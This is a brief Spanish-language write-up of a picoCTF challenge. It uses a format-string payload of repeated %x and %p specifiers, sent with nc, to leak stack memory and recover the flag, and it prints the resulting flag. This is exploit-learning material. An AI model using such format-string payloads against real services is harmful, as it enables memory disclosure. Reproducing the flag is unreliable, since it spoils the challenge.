## Objetivo 

Story telling class 1/2

Additional details will be available after launching your challenge instance.

## Solución  

```JAVA
┌──(kali㉿kali)-[~/Downloads/flagLeak]
└─$ python3 -c 'print("%x"*60)' | nc saturn.picoctf.net 54798
saturn.picoctf.net [13.59.203.175] 54798 (?) : Connection refused
┌──(kali㉿kali)-[~/Downloads/flagLeak]
└─$ python3 -c 'print("%x"*60)' | nc saturn.picoctf.net 63553
Tell me a story and then I'll tell you one >> Here's a story - 
ffd5f470ffd5f4908049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825f0108d00eff8dab06f6369707b4654436b34334c5f676e3167346c466666305f3474535f315f6b63623261317d613235fbad200088ffb9000f0144990804c00080494100804c000ffd5f55880494182ffd5f604ffd5f6100ffd5f570
```



abrimos la terminal de python, y escribimos un print ("%p" *120)

```java

┌──(kali㉿kali)-[~/Downloads/flagLeak]
└─$ python3                    
Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print ("%p" *120)
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
>>> exit()
---------------------------------------------------

```


creamos un archivo donde ingresamos un código el cual hará que nos acomode la bandera

```java 
┌──(kali㉿kali)-[~/Downloads/flagLeak]
└─$ nano flag.py               

┌──(kali㉿kali)-[~/Downloads/flagLeak]
└─$ python3 flag.py
picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}û

```


**picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}**


## Notas Adicionales 

### Referencias